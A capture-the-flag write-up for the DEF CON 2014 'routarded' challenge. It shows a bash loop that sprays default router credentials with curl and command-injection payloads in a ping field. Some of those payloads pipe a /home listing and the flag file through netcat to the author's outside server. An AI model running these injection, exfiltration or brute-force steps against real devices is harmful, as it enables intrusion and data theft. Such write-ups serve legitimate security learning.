# DEF CON CTF Qualifier 2014: routarded

**Category:** Baby’s First
**Points:** 1
**Description:**

> Wow, they forwarded http on a router with default creds?
>
> http://routarded_87f7837f50a5370771b9467d840c93c5.2014.shallweplayaga.me:5000/

## Write-up

The hint mentioned default credentials, so we tried some default credentials. After some trying, we found out leaving the username field empty and entering `admin` for the password successfully logged us in.

In the router’s web interface, there was a page to ping IP addresses and domain names (amongst other things). When we attempted to add another command to that, the command was sanitized. For example, entering `8.8.8.8; ls` got sanitized into `8.8.8.8`. However, we saw the sanitizing happening in the browser. Seems like a case of JavaScript-only protection!

We disabled JavaScript in our browser and tried entering `; ls`. This effectively bypassed the filter (i.e. they didn’t do any sanitizing on the back-end), and we got the directory listing this time:

```
bower_components
flag
requirements.txt
routarded.py
static
templates
```

The `flag` file seemed like the right thing. Let’s enter `; cat flag`:

```
The flag is: l0l, can't believe they still do this shit
```

## Write-up 2 (by @d1rt_diggler)

**Note: this is from memory, so some details might be slightly off.**

### Casing the joint

Connecting to the server via browser greated you with a standard HTTP auth prompt. There was no splash page, and I don’t recall anything fancy in the headers, so no hints there…

###Defaults, okay, but WHICH defaults?
I started with your basics by hand (you never know!) admin:admin, admin:password, admin:blank, administrator:administrator, etc.
all without success, I didn't have a password list for router defaults on hand but about 2 minutes of Goog-fu turned some up.  I found http://defaultpassword.com and liked the format and variety, so I just did a full copy and paste of the home page (which lists all the passwords by default, awesome!) and dropped it into a text file.

The defaults were kind of weird though and since it seems to be crowd sourced the standarization for (blank), (none), n/a, etc. was... well, not standard.  I ended up passing the list through a couple grep and awk 1 liners to get only HTTP auth versions and to clean it up the non-standard types for "blank".
```
$ cat passwords.txt | awk '{print $6" "$7}' > first_pass.txt
$ cat first_pass.txt | awk {gsub('\\(none\\)','',$1); gsub('\\(none\\)','',$2);print $1" "$2}' > second_pass.txt
$ cat second_pass.txt | awk {gsub('n\\a','',$1); gsub('n\\a','',$2);print $1" "$2}' > third_pass.txt
$ cat third_pass.txt | awk {gsub('\\(blank\\)','',$1); gsub('\\(blank\\)','',$2);print $1" "$2}' > last_pass.txt
```
Those turned this...
```
3com    cellplex        7000    Telnet  admin   admin   Admin   No
3COM    CellPlex        7000    Telnet  tech    tech    Admin   No
3COM    CellPlex                HTTP    admin   synnet  Admin   No
3COM    CoreBuilder     7000/6000/3500/2500     Telnet  debug   synnet          No
3COM    CoreBuilder     7000/6000/3500/2500     Telnet  tech    tech            No
3COM    HiPerARC        v4.1.x  Telnet  adm     (none)  Admin   No
```
Into this... (roughly... it wasn't perfect, but I was aiming for "good enough")
```
admin admin
tech tech
admin synnet
debug synnet
tech tech
adm
```
Now we had a condensed list, but there were some dupes, no use in retrying pairs.
```
$ cat last_pass.txt | sort | uniq > uniq_pass.txt
```
This would turn
```
admin admin
admin admin
admin password
admin admin
admin administrator
admin admin
admin administrator
admin password
```
Into
```
admin admin
admin administrator
admin password
```
Which would reduce the amount of time it needed to test since we wouldn't be pointlessly testing the same creds over and over.

Now I wanted to format these into the HTTP user:pass format for curl
```
$ cat uniq_pass.txt | awk '{print $1":"$2}' > http_auths.txt
```
Which turned the list generated earlier into
```
admin:admin
tech:tech
admin:synnet
debug:synnet
tech:tech
adm:
```
###We've got our creds, now we need to test em'
Open up good ole vim and pumped out a shell script that would loop over the creds file and attempt
a curl to the router using a set of credentials... if it failed, it would be a 1 line error, if it
worked I'd see a flood of HTML content.

```bash
#!/usr/bin/env bash
users=$(cat http_auths.txt);
for user in $users; do
  echo $user;
  echo "";
  curl -u "$user" "http://routarded_87f7837f50a5370771b9467d840c93c5.2014.shallweplayaga.me:5000/";
  echo "-----"
done;
```

Run it and scan the results for a successful auth.

```bash
$ ./test_auths | less
```

### `[BLANK]:admin`

Of course, the one default I didn’t think to try by hand… OF COURSE!

### Now we're in, let's look around
There really wasn't much to see, under the "tools" or "settings" tab (I can't remember which) there were
two tools that caught my eye, one was a traceroute, the other ping.  Running either returned nothing. I
actually thought something was misconfigured (like legitmately, not in the "break this piece" sense) and
looked around for a few more minutes before deciding to see if I could abuse the ping tool. I was going
in blind though since I couldn't tell if these tools were even getting to a system behind the scenes...
how could I do a simple blind test to see...

```
ping [ google.com ]
(page hangs for roughly 3 seconds, loads)
ping [ 127.asdf.asdf.174188 ]
(page loads immediately)
```

Hmmm okay, so it does seem like it's actually running a ping in the background, maybe it's injectable? I can't
really tell from the busted ass web UI tho... maybe I can get it to phone home.  I jump on my public facing VPS
and type in:

```
$ nc -vvv -lp 4545
Listening on any address 4545 (worldscores)
```

Time to find out...

```
ping [ 127.0.0.1; nc myvps.domains.lol 4545; ]
```

YEAH BUDDY!

```
Connection from 133.7.101.256:49245
```

### Scope the joint

Well we confirmed we had an injectable script, and we confirmed we could phone home, now we just need to
get our hands on that flag... but where the hell is it and where the hell am I?!

```
ping [ 127.0.0.1; ls -lahR /home/ | nc myvps.domains.lol 4545; ]
```

On my listening machine...

```
..snip..
/home/routarded/ (or / I don't remember...)
-rw-r--r--  1 routarded routarded  21   May 14 19:56 flag
..snip..
```

### Gettin’ the goods

Well, we've found it, so we’re pretty much done, all I need to do now is read the file and we’re golden.
```
ping [ 127.0.0.1; cat /home/routarded/flag | nc myvps.domains.lol 4545; ]
```

And on my listening machine...

```
$ nc -vvv -lp 4545
Listening on any address 4545 (worldscores)
Connection from 133.7.101.256:49245
The flag is: l0l, can't believe they still do this shit
```

## Other write-ups and resources

* <http://www.incertia.net/blog/defcon-ctf-qualifiers-2014-routarded/>
* <https://hackucf.org/blog/routarded/>
